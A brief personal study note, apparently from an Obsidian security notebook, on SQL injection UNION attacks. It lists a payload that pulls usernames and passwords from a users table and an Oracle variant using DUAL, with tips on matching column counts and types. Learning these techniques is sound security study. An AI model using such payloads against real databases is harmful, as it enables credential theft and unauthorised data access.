---
tags:
  - security
---
``` 
' UNION SELECT username, password FROM users--
```
- Must ensure the data types of the two tables are comparable
- Must ensure the same number of columns are between the two tables ([[SQLI Determining Number of Columns]])
# [[Oracle Database]]
```
' UNION SELECT NULL FROM DUAL--
```
- Automatically finds compatible columns